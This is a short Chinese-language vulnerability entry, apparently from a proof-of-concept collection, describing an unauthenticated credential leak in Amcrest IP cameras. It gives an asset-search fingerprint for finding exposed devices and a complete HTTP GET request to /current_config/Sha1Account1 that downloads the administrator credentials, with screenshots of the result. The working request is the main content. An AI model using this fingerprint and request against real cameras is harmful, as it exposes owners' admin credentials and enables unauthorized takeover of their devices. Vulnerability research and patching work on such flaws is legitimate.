# Amcrest IP Camera Web Sha1Account1账号密码泄漏漏洞

### 一、漏洞描述
Amcrest IP Camera Web是Amcrest公司的一款无线IP摄像头，设备允许未经身份验证的攻击者下载管理凭据。

### 二、影响版本
<font style="color:#000000;">Amcrest-IP-Camera-Web</font>

### 三、资产测绘
```plain
"Amcrest"
```

![1721627251064-39b3ae91-5e59-4760-9155-86c277d8cf99.png](./img/8XlmibRRnPef1JSZ/1721627251064-39b3ae91-5e59-4760-9155-86c277d8cf99-615793.png)

### 四、漏洞复现
```plain
GET /current_config/Sha1Account1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

![1721627347286-63be31c8-de32-4cfb-bfbb-75d44228384e.png](./img/8XlmibRRnPef1JSZ/1721627347286-63be31c8-de32-4cfb-bfbb-75d44228384e-589306.png)

![1721627357667-e73bab23-0123-4255-b16f-0aae0e14ec30.png](./img/8XlmibRRnPef1JSZ/1721627357667-e73bab23-0123-4255-b16f-0aae0e14ec30-645933.png)



> 更新: 2024-08-12 17:48:53  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/aaoz7mqhlml5nepq>